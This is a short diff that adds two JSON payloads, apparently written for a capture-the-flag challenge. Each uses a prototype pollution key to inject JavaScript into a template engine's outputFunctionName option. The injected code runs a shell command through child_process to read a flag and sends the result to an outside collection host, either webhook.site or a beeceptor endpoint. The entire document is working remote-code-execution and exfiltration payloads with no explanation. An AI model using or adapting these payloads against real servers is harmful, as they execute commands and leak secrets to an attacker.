@@ -1,0 +1,8 @@
+{
+    "constructor/prototype/outputFunctionName": "a=1;const http=process.mainModule.require('https');const flag=process.mainModule.require('child_process').execSync('/readflag').toString();req=http.get(`https://webhook.site/xxx?q=${flag}`);req.end();//"
+}
+
+
+{
+    "constructor/prototype/outputFunctionName":"_tmp1;console.log(global.process.mainModule.require('http').get('http://rinrin.free.beeceptor.com', {headers: {'User-Agent':global.process.mainModule.require('child_process').execSync('./readflag').toString('base64')}}));var __tmp2"
+}
